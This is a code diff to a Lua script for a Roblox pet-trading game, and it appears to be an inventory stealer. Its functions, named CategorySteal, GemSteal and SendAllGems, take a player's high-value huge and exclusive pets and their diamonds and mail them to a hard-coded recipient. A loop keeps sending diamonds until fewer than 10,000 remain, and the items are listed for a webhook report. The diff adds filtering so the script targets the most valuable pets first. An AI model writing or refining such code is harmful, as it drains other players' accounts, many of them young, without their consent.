@@ -132,7 +132,7 @@ local function getRAP(Type, Item)
 	return 0
 end
 
-local function sendItem(category, uid, am, id, rap)
+local function sendItem(category, uid, am)
     local args = {
         [1] = user,
         [2] = MailMessage,
@@ -145,9 +145,18 @@ end
 
 local function CountCategory(category)
 	local count = 0
-	for i, v in pairs(save[category]) do
-		if getRAP(category, v) >= min_rap then
-			count = count + 1
+	if category == "Pet" then
+		for i, v in pairs(save[category]) do
+			local dir = library.Directory.Pets[v.id]
+			if getRAP(category, v) >= min_rap and (dir.huge or dir.exclusiveLevel) then
+				count = count + 1
+			end
+		end
+	else
+		for i, v in pairs(save[category]) do
+			if getRAP(category, v) >= min_rap then
+				count = count + 1
+			end
 		end
 	end
 	return count
@@ -157,16 +166,26 @@ local function CategorySteal(category)
 	local Sent = 0
 	local initial = CountCategory(category)
 	local sortedItems = {}
-	for i, v in pairs(save[category]) do
-		local rapValue = getRAP(category, v)
-		if rapValue >= min_rap then
-			table.insert(sortedItems, {uid = i, rap = rapValue})
+
+	if category == "Pet" then
+		for i, v in pairs(save[category]) do
+			local rapValue = getRAP(category, v)
+			local dir = library.Directory.Pets[v.id]
+			if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
+				table.insert(sortedItems, {uid = i, rap = rapValue})
+			end
+		end
+	else
+		for i, v in pairs(save[category]) do
+			local rapValue = getRAP(category, v)
+			if rapValue >= min_rap then
+				table.insert(sortedItems, {uid = i, rap = rapValue})
+			end
 		end
 	end
 	table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
 	for _, item in ipairs(sortedItems) do
 		local v = save[category][item.uid]
-		local id = v.id
 		if v._lk then
 			local args = {
 			[1] = i,
@@ -174,7 +193,7 @@ local function CategorySteal(category)
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
 		end
-		sendItem(category, item.uid, v._am or 1, id, item.rap)
+		sendItem(category, item.uid, v._am or 1)
 		local final = CountCategory(category)
 		if final < initial then
 			Sent = Sent + 1
@@ -209,17 +228,6 @@ local function GemSteal()
     end
 end
 
-local function EmptyBoxes()
-    if save.Box then
-        for key, _ in pairs(save.Box) do
-			local args = {
-				[1] = key
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
-        end
-    end
-end
-
 local function CountGems()
 	for i, v in pairs(GetSave().Inventory.Currency) do
 		if v.id == "Diamonds" then
@@ -232,6 +240,17 @@ local function SendAllGems()
 	repeat
 		GemSteal()
 	until CountGems() == nil or CountGems() < 10000
+end
+
+local function EmptyBoxes()
+    if save.Box then
+        for key, _ in pairs(save.Box) do
+			local args = {
+				[1] = key
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+        end
+    end
 end
 
 local function CountHuges()
@@ -247,11 +266,22 @@ local function CountHuges()
 end
 
 local function CategoryWebhook(category)
-	for i, v in pairs(save[category]) do
-		local rapValue = getRAP(category, v)
-		if rapValue >= min_rap then
-			local id = v.id
-			table.insert(itemsToSend, {name = id, rap = rapValue})
+	if category == "Pet" then
+		for i, v in pairs(save[category]) do
+			local rapValue = getRAP(category, v)
+			local dir = library.Directory.Pets[v.id]
+			if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
+				local id = v.id
+				table.insert(itemsToSend, {name = id, rap = rapValue})
+			end
+		end
+	else
+		for i, v in pairs(save[category]) do
+			local rapValue = getRAP(category, v)
+			if rapValue >= min_rap then
+				local id = v.id
+				table.insert(itemsToSend, {name = id, rap = rapValue})
+			end
 		end
 	end
 end
